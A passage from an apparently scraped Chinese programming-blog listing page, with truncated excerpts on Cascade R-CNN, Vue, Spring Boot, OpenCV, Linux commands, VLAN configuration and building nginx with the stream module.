2）输出iou一般大于输入iou，图中彩色线条在灰色对角线上面。说明每一级都会在内部提升精度。
3）在3级的级联中，输入iou和输出iou正相关，线条呈上升趋势，输入候选框proposals质量越高，最后的输出box越好。
4）对所有box，没有最佳的阈值，同一条线不会始终高于另外2条线。在input iou较小时，输入较小的阈值u=0.5，输出蓝线最高；在input iou较大时，输入较大的阈值u=0.7，输出红线最高
5）在多个级联中，前一级的输出是后一级的输入，输入质量逐渐变好，阈值逐渐提高，输出质量也逐渐变好
几种multi-stage结构的比较
a)为经典的2阶段Faster R-CNN
b)为本文提出的Cascade 方法，一共是1+3=4个stages: 1个RPN+3个检测器(阈值设定分别为0.5/0.6/0.7)。最后cls是3个stage求平均，bouding box regression直接从最后一个stage获得。
c)Iterative BBox多阶段共享了 H1和阈值0.5，问题：同一阈值对不同iou输入的box表现能力不同；从阈值那张图的输入输出可以看出，输出已经改变了分布，不适合再用同一个H了。论文里还有一张散点图说明。
d)Integral Loss 公用pool，用不同的H和阈值。问题：第一个stage会过拟合，统一的H也不适合多级分布
总的来说，实验性结论是用3个pool+3个不同head效果最好。
模型大小、速度、精度AP变化：
加入cascade机制后，模型变大、AP提高、速度影响不是很大。适合资源够且对速度没有太高要求的场景。
几个相关概念：
two-stage：rpn网络先找出候选框，后进行分类回归，得到更精确的框，慢但准，如RCNN，Fast RCNN， Faster RCNN， Mask RCNN, One-stage：直接产生候选框，快，如ssd、yolo
IOU阈值：在two-stage算法中有2个iou阈值，训练阶段，用阈值一区分positive和negitive，选择部分候选框，控制正负样本比例；推理阶段，用阈值二计算map
mismatch：训练和测试阶段的不匹配问题，训练阶段采用的Proposals 经过了处理，控制了positive和negitive的比例（positive和negitive的区分基于和gt的IOU，阈值的设置是个超参数，一般是0.5）。测试阶段的proposals是前序步骤的所有。 推荐阅读： maskrcnn原理
https://blog.csdn.net/remanented/article/details/79564045
RPN（Region Proposal Network）和 Anchor 理解_梦星魂24的博客-CSDN博客_anchor network
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f78463848b0914959f78c67a673884d6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fedf58ab922e76007058710435b83341/" rel="bookmark">
			搜索？——P3956 [NOIP2017 普及组] 棋盘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		传送门: [NOIP2017 普及组] 棋盘 - 洛谷
思路: 将棋盘的每一个格子看做一个点，建一个无向图用来跑最短路.
这道题本应用搜索来做，但是转换成最短路好像简单点
建图:
1.对于已经有颜色的格子，在扫描四个方向的格子对相同颜色的建条长度为0的边，不同颜色的建条长度为1的边
2.对于没有颜色的格子，对于四个方向所有有颜色的格子都要先建条长度为2的边，再在四周有颜色格子之间两两建边，颜色相同就建长度为2的边，颜色不同就建长度为3的边，如下图所示一个没有颜色的格子四周格子的边
建好边就可以跑spfa了，但是这个做法只有90分
90分(满分100)的代码：
#include&lt;bits/stdc++.h&gt; using namespace std; #define int long long typedef pair&lt;int,int&gt; PII; const double PI=3.1415926535; const int N=1e6+10; bool st[N]; int d[110][110]; int dx[4]={-1,0,1,0}; int dy[4]={0,1,0,-1 }; int e[N],ne[N],w[N],h[N],idx; int dist[N]; int n,m; void add(int a,int b,int c) { e[idx]=b,ne[idx]=h[a],w[idx]=c,h[a]=idx++; } void spfa() { memset(dist,0x3f,sizeof dist); dist[m+1]=0; queue&lt;int&gt;que; que.push(m+1); while(que.size()) { int t=que.front(); que.pop(); st[t]=false; for(int i=h[t];~i;i=ne[i]) { int j=e[i]; if(dist[j]&gt;dist[t]+w[i]) { dist[j]=dist[t]+w[i]; if(!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fedf58ab922e76007058710435b83341/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b39d17d63ef4efdbbc7e27651324209f/" rel="bookmark">
			CSS 排行榜
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CSS 排行榜 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;排行榜&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } /* 容器 */ .rank-container { width: 400px; color: #333; font-size: 14px; background-color: #fff; border-radius: 5px; border: 1px solid silver; margin: 100px auto; } /* 标题 */ .rank-title { font-size: 30px; padding: 30px 20px; } /* 内容主体 */ .rank-body { padding: 0 30px 20px; } /* 每项样式 */ .item { display: flex; align-items: center; margin-bottom: 20px; } /* 数字 */ .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b39d17d63ef4efdbbc7e27651324209f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3aef86832be59e280ae540781994345b/" rel="bookmark">
			OpenCV中图像的平移、旋转、倾斜、透视的讲解与实战（附Python源码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需要源码请点赞关注收藏后评论区留言私信~~~
一、仿射变换 仿射变换是一种仅在二维平面中发生的几何变形，变换之后的图形仍然可以保持直线的平直性和平行性，也就是说原来的直线变换之后还是直线，平行线变换之后还是平行线，常见的仿射变换包括平移 旋转和倾斜
OpenCV通过cv2.warpAffine()方法实现仿射变换效果 语法如下
dst=cv2.warpAffine(src,M,dsize,flags,borderMode,borderValue)
M 一个二行三列的矩阵 根据此矩阵的值变换原图中的像素位置
dsize 输出图像的尺寸大小
flags 插值方式 建议使用默认方式
borderMode 边界类型
borderValue 边界值
M也被叫做仿射矩阵 实际上是一个2*3的列表
M=[[a,b,c],[d,e,f]] 仿射变换输出的图像按照以下公式计算
新x=原x*a+原y*b+c
新y=原x*d+原y*e+f
平移 平移就是让图像中的所有像素同时沿着水平或者垂直方向移动，实现这种效果只需要将M设置为以下即可
M=[[1,0,水平移动距离],[0,1,垂直移动的距离]]
让图像向右下方平移效果如下
import cv2 import numpy as np img = cv2.imread("demo.png") # 读取图像 rows = len(img) # 图像像素行数 cols = len(img[0]) # 图像像素列数 M = np.float32([[1, 0, 50], # 横坐标向右移动50像素 [0, 1, 100]]) # 纵坐标向下移动100像素 dst = cv2.warpAffine(img, M, (cols, rows)) cv2.imshow("img", img) # 显示原图 cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3aef86832be59e280ae540781994345b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54c0a365f7275ea5aa054210f1ea6761/" rel="bookmark">
			linux文件操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.查看文件内容
相关命令：cat、tac、head、tail、more、less
cat格式：cat [options] file1 file2
主要参数:
-n:对所有行编号
-b:和-n类似，不对空白行编号
-s:当遇到连续2行以上空白行时，就代换为一行空白行
实例：
[root@localhost ~]# cat -n conf
1 login:***/***@***
2 port:12347
而tac命令和cat类似，实际就是cat反过来写，所以是逆序显示文件内容。
实例：
[root@localhost ~]# tac conf
port:12347
login:***/***@***
head命令用于查看一个文本文件的开头部分；而tail命令则用于显示文本文件的尾部
格式：head/tail [options] filename
主要参数：
-n num：显示文件开头/结尾的num行
实例：
[root@localhost ~]# head -n 5 a.c
#include
#include
#include
int main()
tail还有个-f选项。当显示文件后十行内容变化后，自动显示新增的文件内容。这一条命令非常有用，尤其在监控日志文件时，可以在屏幕上一直显示新增的日志信息。
more/less命令用来浏览超过一页的文件。不同的是more让画面在显示满一页时暂停，按空格健继续显示下一个画面，或按Q键停止显示。less命令除了可以按空格键向下显示文件外，还可以利用上下键来卷动文件。当要结束浏览时，只要在less命令的提示符“：”下按Q键即可。
2.查看文件类型
命令：file
格式：file [-options] filename
主要参数：
-v:显示版本信息
-z：探测压缩过的文件类型
-f name:从文件name中读取要分析的文件名列表
实例：
[root@localhost ~]# file conf
conf: ASCII text
[root@localhost ~]# file server.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54c0a365f7275ea5aa054210f1ea6761/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d78b26fccf8cf9a401a2a2d3a324f378/" rel="bookmark">
			Linux配置固定ip
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一.为什么要配置固定IP地址？
1.IP地址是如何获得的？
2.麻烦之处
二.操作步骤
1.在VMware中配置IP地址网关和网段（IP地址的范围）
打开VMware --&gt; 左上角“编辑” --&gt; “虚拟网络编辑器”
点击“VMnet8” --&gt; 点击右下角“更改设置”
点击“VMnet8” --&gt; 将下面“子网IP”及“子网掩码”设置成如图参数 --&gt; 点击“NAT设置”
将“网关”参数如图配置
全部点击“确定”并退出
2.在Linux系统中手动修改配置文件，固定IP
配置相应文件
停止并重启网卡
一.为什么要配置固定IP地址？ 1.IP地址是如何获得的？ 通过DHCP服务动态获取，则可能因为重启等原因使IP地址发生变化。
2.麻烦之处 对于普通的家用办公用电脑，IP地址发生变化无伤大雅。但是我们需要在Windows系统中远程连接到Linux虚拟机，IP地址总变化会要求我们频繁进行配置的更改，很麻烦。
二.操作步骤 1.在VMware中配置IP地址网关和网段（IP地址的范围） 打开VMware --&gt; 左上角“编辑” --&gt; “虚拟网络编辑器” 点击“VMnet8” --&gt; 点击右下角“更改设置” 点击“VMnet8” --&gt; 将下面“子网IP”及“子网掩码”设置成如图参数 --&gt; 点击“NAT设置” 将“网关”参数如图配置 全部点击“确定”并退出 注意：一定要点击确定~
2.在Linux系统中手动修改配置文件，固定IP （使用root用户进行如下操作）
配置相应文件 这里需要注意的是有的人没有下面说的这个文件，其文件路径可能是/etc/NetworkManager/system-connections，也还有可能有其他的不同情况，下述方法仅作为参考
停止并重启网卡 systemctl stop network
systemctl start network
然后就好啦~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/103f3f31959cd0c583c099e17fe0422b/" rel="bookmark">
			spring boot &#43;mybatisplus&#43;vue 开发日记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、spring boot 学习---开搞idea（没有涉及数据库） *快速使用 --------hello world之spring boot 1、利用IDEA提供的Spring Initializr创建SpringBoot应用
2.创建controller包（注意是跟主启动类一个级别，否则访问不了），在目录controller中，
创建HelloController.java文件
启动项目，在浏览器窗口中输入“http://localhost:8080/hello”
完成！！
**环境热部署--部署之后不用重新编译、重新启动，影响开发效率。 第一步：在pom.xml配置文件中添加dev-tools依赖。
&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;/dependency&gt; 第二步：在application.properties中配置devtools。
#热部署生效 spring.devtools.restart.enabled=true #设置重启目录 spring.devtools.restart.additional-paths=src/main/java #设置classpath目录：下WEB-INF文件夹内容修改不重启 spring.devtools.restart.exclude=static/** 第三步：
打开Settings页面，在左边的菜单栏依次找到Build,Execution,Deployment→Compile，勾选Build project automatically（每个项目都要重新搞）
按 Ctrl+Shift+Alt+/ 快捷键调出Maintenance页面，单击Registry，勾compiler.automake.allow.when.app.running复选框。（设置一次，以后就不用了）
然后以后按ctrl+ s 保存，即可自动编译
***springboot常识 导入别人的项目：需要改maven配置地址。
Spring Boot将传统Web开发的mvc、json、tomcat等框架整合，提供了spring-boot-starter-web组件，创建SpringBoot项目勾选Spring Web选项后，会自动将spring-boot-starter-web组件加入到pom文件中。如下：
&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; 控制器
看回前面创建的controller包控制器（称为控制器），里面的HelloController类
Spring Boot提供@Controller和@RestController两种注解来标识此类负责接收和处理HTTP请求。 如果请求的是页面和数据，使用@Controller注解即可；如果只是请求数据，则可以使用@RestController注解。
@RequestMapping注解主要负责URL的路由映射。它可以添加在Controller类或者具体的方法上。（上面就是加在index方法上），除此还有@GetMapping、@PostMapping。写完这两个注解，用户在前端浏览器输入该地址就会跳转到该方法上。
访问静态资源例如图片
将图片放置在static目录下： 即可访问
文件上传
在properties文件中加入 spring.servlet.multipart.max-file-size=10MB 可上传10M的文件
拦截器（Interceptor）
拦截器在Web系统中非常常见，对于某些全局统一的操作，我们可以把它提取到拦截器中实现。如登录检测，进入处理程序检测是否登录，如果没有，则直接返回登录页面。读取cookie得到用户信息并将用户对象放入请求，从而方便后续流程使用，
拦截器的执行流程：
1.程序先执行preHandle()方法，如果该方法的返回值为true，则程序会继续向下执行处理器中的方法，否则将不再向下执行。
2.在业务处理器（即所谓控制器Controller类）处理完请求后，会执行postHandle()方法，然后会通过DispatcherServlet向客户端返回响应。
3.在DispatcherServlet处理完请求后，才会执行afterCompletion()方法。
多个拦截器的执行顺序是: 拦截器A的preHandler--&gt;拦截器B的preHandler--&gt;B的postHandler--&gt;A的postHandler--&gt;B的afterCompletion--&gt;A的afterCompletion
使用步骤：1、建立一个intercepter包（与controller包同级）， 建立一个LoginInterceptor类 去implements 父类 HandlerInterceptor
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/103f3f31959cd0c583c099e17fe0422b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8c6af043b86762782883b84aa62c9b6/" rel="bookmark">
			Vue指令（常用指令介绍和使用、自定义全局与局部指令、钩子函数和钩子函数参数等）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Vue指令
v-model
修饰符
v-bind:（:）
修饰符
绑定属性
绑定样式
对象和数组的绑定的方式注意点
v-on:（@）
修饰符
v-show
v-if
v-else
v-else-if
v-for
复用原则导致数据混乱问题
解决方法
v-text
v-html
v-once
v-clock
v-slot:(#)
自定义指令
自定义全局指令
Vue.directive('color',{bind(el,obj,vnode,oldVnode){}})
自定义局部指令
new Vue（{el:'#app',data:{},directives:{color:{bind(el,obj,vnode,oldVnode){}}}）
钩子函数
钩子函数参数
具体参数作用实例
Vue指令 Vue内部提供的自定义的属性，属性中封装好了Vue内部实现的一些功能，通过这些功能可以实现数据驱动节点更新。然后Vue的指令=后面引号中的环境相当于是data对象中的js环境（但不能在其中运行代码，只能传表达式或数据值），例如v-text='message'，便会去data中找message（相当于此时的this=data，但是不能在字符串中使用this），如果想让v-text就等于字符串的message，那么使用v-text="'message'"。然后由于相当于js环境，那么还可以写表达式例如v-text='1+1'，那么会先计算出2再返回给v-text。注意Vue选取的区域中，元素中只有带有Vue指令的等号后面引号中的环境才相当于data对象中的js环境。
v-model 用于在表单&lt;input&gt;、&lt;textarea&gt;、&lt;select&gt;元素上创建双向数据绑定其value值。使用方法：通过标签属性中添加v-model='name'，其中name为data对象中的属性。显示时，data.name的值会赋值给input.value，同时在输入文本时的值也会赋值给data.name。注意在绑定checkbox类型的input标签（复选框）时，给多个input标签添加属性v-model='group'（group为一个数组），然后给每个标签分别添加不同的value='value1'...，这时的group会按顺序存储勾选了的input标签中的value值（长度为勾选的个数），当更改group数组对应顺序的值为input上设置的value值（'value1'），则对应的复选框会被勾选，不为则不会被勾选。当绑定单选框时，给多个input标签添加属性v-model='str'（str为空字符串），然后给每个标签分别添加不同的value='value1'...，当选中其中一个单选框例如属性为value='value1'的，则str='value1'，会对应相等，修改str='value2'，则value值为'value2'的标签也会对应被勾选。
修饰符 通过在v-model后添加的修饰符，可以链式编写。例如v-model.lazy='fun'。
（.lazy）- 当输入框失去焦点才同步数据。（.number）- 使双向绑定的数据变为数字类型。（.trim）- 去除双向绑定的数据中首位的空格（不去中间的）。 v-bind:（:） 用于标签属性绑定数据。使用方法：在标签属性前加v-bind:（v-bind可以省略），例如v-bind:value='name'或表达式，这时会将data.name的值赋值给属性value，注意绑定数据后，可以仍然可以直接给属性赋值，例如:style="'color:red'"，style="font-size:100px"，此时2条都会生效。:abc='1'拿到的是数字类型的1，不绑定拿到的是字符串的。
修饰符 .sync：通过在绑定的属性后面添加该属性符，可以通过this.$emit('updata:属性名',newValue)更新属性值，只用于绑定在组件标签上，在组件内部通过该方法更新属性值，相当于子组件向父组件传递消息。
//父组件,其中isShow是父组件data中的数据 &lt;comp :visibility.sync="isShow"&gt;&lt;/comp&gt; //comp组件中可以通过this.$emit('update:visibility', true)来改变属性visibility的值 //相当于 &lt;comp :show="isShow" @update:show="val =&gt; isShow = val"&gt;&lt;/comp&gt; 绑定属性 name的值可以为对象，比如data:{name:{'size':true','color':false}相当于class="size"。注意:class="['size','color']"相当于class="size color"；:class="['size',color?'color' : '']"会去data中查询color是true还是false，当为true时，相当于class="size color"，为false相当于class="size"；:class="['size',{'active':false}]"相当于class="size"。
绑定样式 例如:style="{color:'red','font-size':'100px'}"，注意样式中如果带-符号的也需要用引号裹起来。也可以通过对象绑定，:style=obj，data:{obj:{'color':'red','font-size':'100px'}}，和之前效果一样，如果有多个样式对象（同obj一样），要把这些对象中的样式都绑定给标签时，使用数组即可例如:style="[obj1,obj2,...,objn]"即可。
对象和数组的绑定的方式注意点 对象的绑定方式，例如我们new vm=Vue（{.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8c6af043b86762782883b84aa62c9b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/494fe0e3f25296bc0599584d86d94bcf/" rel="bookmark">
			linux下df -h 命令一直卡住的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Linux中，偶尔遇到用 df -h 查看磁盘情况时，一直卡住无法显示结果。
解决方法： 1、首先使用strace追踪到底执行到哪里卡住
strace df -h 2、如果没有strace命令则进行安装
yum install strace 3、显示出卡住的地方，如：
stat("/proc/sys/fs/binfmt_misc",
4、重启卡住服务
systemctl restart proc-sys-fs-binfmt_misc.automount 5、重启完即可正常使用 df -h
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b25301ad6ff9f03f2b60e639fa02fd5/" rel="bookmark">
			springcloud 父项目pom已经引入了springcloud版本,但是子项目引入openfeign,nacos等依赖时候报错无法找到版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 问题:
springcloud 父项目pom已经引入了springcloud版本,但是子项目引入openfeign,nacos等依赖时候报错无法找到版本
按照道理,父项目pom引入了springcloud版本,对应子项目引入的cloud的生态组件(openfeign,nacos,gateway),不需要version,springcloud里面的依赖已经自带了. 但是还是提示找不到版本的错误
我的原因是:
父项目里面也引入了,而且没有带有version,删掉就行了. (估计是覆盖了springcloud自带的,导致没有version)
&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/549768ef7ab82ccfe5998da88eb73da5/" rel="bookmark">
			ensp实现不同VLAN之间的通信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.VLAN的基本配置 一个简单的VLAN实验，基本配置如图。
其中交换机为S5700。
在只对四台PC配置IP地址，交换机不用配置后，四台PC可以互相ping通。
下面是对交换机配置VLAN的方法
&lt;Huawei&gt;sys #进入系统视图 [Huawei]vlan 10 #创建vlan 10 [Huawei]vlan 20 #创建vlan 20 [Huawei]int g0/0/1 #进入交换机1号接口 [Huawei-GigabitEthernet0/0/1]port link-type access #设置一号接口为access口(二号口也是一样的) [Huawei-GigabitEthernet0/0/1]port default vlan 10 #为接口设置默认vlan [Huawei-GigabitEthernet0/0/3]port link-type trunk #设置三号接口为truck口 [Huawei-GigabitEthernet0/0/3]port trunk allow-pass vlan all #默认所有打上vlan标记的数据包都能通过 对交换机配置完以后可以用如下命令检查vlan配置情况
[Huawei]display vlan 下面是运行结果
第二台交换机也是一样的配置方法。
对于access口和truck口：
对于批量创建vlan
[Huawei]vlan batch n to m 配置Truck接口的缺省VLAN
[Huawei-GigabitEthernet0/0/3]port truck pvid vlan 10 2.不同VLAN间通信 使用路由器物理接口 上图中，交换机黄线接口设置为vlan10，蓝线接口设置为vlan20 通信过程：当PC1对PC2发起通信时，发现PC2与自己不在同一个网段，便找自己的网关，发送arp获取网关R1的mac后，目的ip为PC2，目的MAC为R1的包发给R1，再从R1的2接口送出去再给PC2。
特点：
路由器三层接口作为网关，转发本网段前往其它网段的流量。路由器三层接口无法处理携带VLAN Tag的数据帧，因此交换机上联路由器的接口需配置为Access。路由器的一个物理接口作为一个VLAN的网关，因此存在一个VLAN就需要占用一个路由器物理接口。路由器作为三层转发设备其接口数量较少，方案的可扩展性太差。 使用路由器子接口（单臂路由） 通信过程：pc1给pc2发送信息，发现pc2的IP与自己不在同一个网段，便寻找自己的网关mac，arp包到R1后收到回应，于是pc1发送了一个目的IP为pc2，目的mac为R1的包，R1收到后又发出，经过LSW4送到了pc6。
对于路由器的配置：
[Huawei]int g0/0/0.10 #进入0/0/0 的一个子接口 [Huawei-GigabitEthernet0/0/0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/549768ef7ab82ccfe5998da88eb73da5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5640c85717e1196cd5231dfc7591d515/" rel="bookmark">
			手把手教你学51单片机-C语言基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二进制、十进制和十六进制 对于二进制来说，8 位二进制我们称之为一个字节。
我们在进行 C 语言编程的时候，我们只写十进制和十六进制，那么不带 0x 的就 是十进制，带了 0x 符号的就是十六进制。
C 语言变量类型和范围 C 语言的数据基本类型分为字符型、整型、长整型以及浮点型。
for 循环语句 while 循环语句 函数 形式参数列表，也叫做形参列表，这个是函数调用的时候，相互传递数据用的
函数值类型，就是函数返回值的类型。
一个工程文件必须有且仅有一个 main 函数，程序执行的时候，都是从 main 函数开 始的。
Keil 软件延时 精确延时有两个方法，一个方法是用定时器来延时，另外一个就是用库函数_nop_();，一个 NOP 的时间是一个机器 周期的时间。
调试看一下延时的时间：
流水灯程序 从左移到右，然后右边左移 #include &lt;reg52.h&gt; sbit ADDR0 = P1^0; sbit ADDR1 = P1^1; sbit ADDR2 = P1^2; sbit ADDR3 = P1^3; sbit ENLED = P1^4; void main() { unsigned int i = 0; //定义循环变量i，用于软件延时 unsigned char dir = 0; //定义移位方向变量dir，用于控制移位的方向 unsigned char shift = 0x01; //定义循环移位变量shift，并赋初值0x01 ENLED = 0; ADDR3 = 1; ADDR2 = 1; ADDR1 = 1; ADDR0 = 0; while (1) //主循环，程序无限循环执行该循环体语句 { P0 = ~shift; //P0等于循环移位变量取反，控制8个LED for (i=0; i&lt;20000; i++); //软件延时 if (dir == 0) //移位方向变量为0时，左移 { shift = shift &lt;&lt; 1; //循环移位变量左移1位 if (shift == 0x80) //左移到最左端后，改变移位方向 { dir = 1; } } else //移位方向变量不为0时，右移 { shift = shift &gt;&gt; 1; //循环移位变量右移1位 if (shift == 0x01) //右移到最右端后，改变移位方向 { dir = 0; } } } } #include &lt;reg52.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5640c85717e1196cd5231dfc7591d515/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/395d903b34620c27cccd6436cc65fb90/" rel="bookmark">
			vue中eventBus事件总线（$emit / $on）使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		eventBus事件总线适用于父子组件、非父子组件等之间的通信，使用步骤如下： (1) 创建事件中心管理组件之间的通信 // event-bus.js import Vue from 'vue' export const EventBus = new Vue() (2) 发送事件 假设有两个兄弟组件firstCom和secondCom： &lt;template&gt; &lt;div&gt; &lt;first-com&gt;&lt;/first-com&gt; &lt;second-com&gt;&lt;/second-com&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import firstCom from './firstCom.vue' import secondCom from './secondCom.vue' export default { components: { firstCom, secondCom } } &lt;/script&gt; 在firstCom组件中发送事件： &lt;template&gt; &lt;div&gt; &lt;button @click="add"&gt;加法&lt;/button&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import {EventBus} from './event-bus.js' // 引入事件中心 export default { data(){ return{ num:0 } }, methods:{ add(){ EventBus.$emit('addition', { num:this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/395d903b34620c27cccd6436cc65fb90/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/440c05f29d76636aa030f17b3a040a9b/" rel="bookmark">
			nginx无证书代理http/https协议两种解决方案——筑梦之路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原理：一般的nginx代理https请求是需要配置ssl证书信息的，走的是七层协议，而stream模块走的是四层协议，在没有第三方证书的情况下一般的nginx代理是无法满足需求的。
操作系统：centos7 nginx版本：1.9.9 nginx官网不同版本下载地址：http://nginx.org/download/ 模块下载：https://github.com/openresty 官网说明： http://nginx.org/en/docs/stream/ngx_stream_core_module.html yum install gcc-c++ 、yum -y install pcre*、yum -y install openssl* wget curl wget http://nginx.org/download/nginx-1.9.9.tar.gz tar -zxvf nginx-1.9.9.tar.gz cd nginx-1.9.9 ./configure --help --help print this message --prefix=PATH set installation prefix --sbin-path=PATH set nginx binary pathname --modules-path=PATH set modules path --conf-path=PATH set nginx.conf pathname --error-log-path=PATH set error log pathname --pid-path=PATH set nginx.pid pathname --lock-path=PATH set nginx.lock pathname --user=USER set non-privileged user for worker processes --group=GROUP set non-privileged group for worker processes --build=NAME set build name --builddir=DIR set build directory --with-select_module enable select module --without-select_module disable select module --with-poll_module enable poll module --without-poll_module disable poll module --with-threads enable thread pool support --with-file-aio enable file AIO support --with-http_ssl_module enable ngx_http_ssl_module --with-http_v2_module enable ngx_http_v2_module --with-http_realip_module enable ngx_http_realip_module --with-http_addition_module enable ngx_http_addition_module --with-http_xslt_module enable ngx_http_xslt_module --with-http_xslt_module=dynamic enable dynamic ngx_http_xslt_module --with-http_image_filter_module enable ngx_http_image_filter_module --with-http_image_filter_module=dynamic enable dynamic ngx_http_image_filter_module --with-http_geoip_module enable ngx_http_geoip_module --with-http_geoip_module=dynamic enable dynamic ngx_http_geoip_module --with-http_sub_module enable ngx_http_sub_module --with-http_dav_module enable ngx_http_dav_module --with-http_flv_module enable ngx_http_flv_module --with-http_mp4_module enable ngx_http_mp4_module --with-http_gunzip_module enable ngx_http_gunzip_module --with-http_gzip_static_module enable ngx_http_gzip_static_module --with-http_auth_request_module enable ngx_http_auth_request_module --with-http_random_index_module enable ngx_http_random_index_module --with-http_secure_link_module enable ngx_http_secure_link_module --with-http_degradation_module enable ngx_http_degradation_module --with-http_slice_module enable ngx_http_slice_module --with-http_stub_status_module enable ngx_http_stub_status_module --without-http_charset_module disable ngx_http_charset_module --without-http_gzip_module disable ngx_http_gzip_module --without-http_ssi_module disable ngx_http_ssi_module --without-http_userid_module disable ngx_http_userid_module --without-http_access_module disable ngx_http_access_module --without-http_auth_basic_module disable ngx_http_auth_basic_module --without-http_autoindex_module disable ngx_http_autoindex_module --without-http_geo_module disable ngx_http_geo_module --without-http_map_module disable ngx_http_map_module --without-http_split_clients_module disable ngx_http_split_clients_module --without-http_referer_module disable ngx_http_referer_module --without-http_rewrite_module disable ngx_http_rewrite_module --without-http_proxy_module disable ngx_http_proxy_module --without-http_fastcgi_module disable ngx_http_fastcgi_module --without-http_uwsgi_module disable ngx_http_uwsgi_module --without-http_scgi_module disable ngx_http_scgi_module --without-http_memcached_module disable ngx_http_memcached_module --without-http_limit_conn_module disable ngx_http_limit_conn_module --without-http_limit_req_module disable ngx_http_limit_req_module --without-http_empty_gif_module disable ngx_http_empty_gif_module --without-http_browser_module disable ngx_http_browser_module --without-http_upstream_hash_module disable ngx_http_upstream_hash_module --without-http_upstream_ip_hash_module disable ngx_http_upstream_ip_hash_module --without-http_upstream_least_conn_module disable ngx_http_upstream_least_conn_module --without-http_upstream_keepalive_module disable ngx_http_upstream_keepalive_module --without-http_upstream_zone_module disable ngx_http_upstream_zone_module --with-http_perl_module enable ngx_http_perl_module --with-http_perl_module=dynamic enable dynamic ngx_http_perl_module --with-perl_modules_path=PATH set Perl modules path --with-perl=PATH set perl binary pathname --http-log-path=PATH set http access log pathname --http-client-body-temp-path=PATH set path to store http client request body temporary files --http-proxy-temp-path=PATH set path to store http proxy temporary files --http-fastcgi-temp-path=PATH set path to store http fastcgi temporary files --http-uwsgi-temp-path=PATH set path to store http uwsgi temporary files --http-scgi-temp-path=PATH set path to store http scgi temporary files --without-http disable HTTP server --without-http-cache disable HTTP cache --with-mail enable POP3/IMAP4/SMTP proxy module --with-mail=dynamic enable dynamic POP3/IMAP4/SMTP proxy module --with-mail_ssl_module enable ngx_mail_ssl_module --without-mail_pop3_module disable ngx_mail_pop3_module --without-mail_imap_module disable ngx_mail_imap_module --without-mail_smtp_module disable ngx_mail_smtp_module --with-stream enable TCP/UDP proxy module --with-stream=dynamic enable dynamic TCP/UDP proxy module --with-stream_ssl_module enable ngx_stream_ssl_module --with-stream_realip_module enable ngx_stream_realip_module --with-stream_geoip_module enable 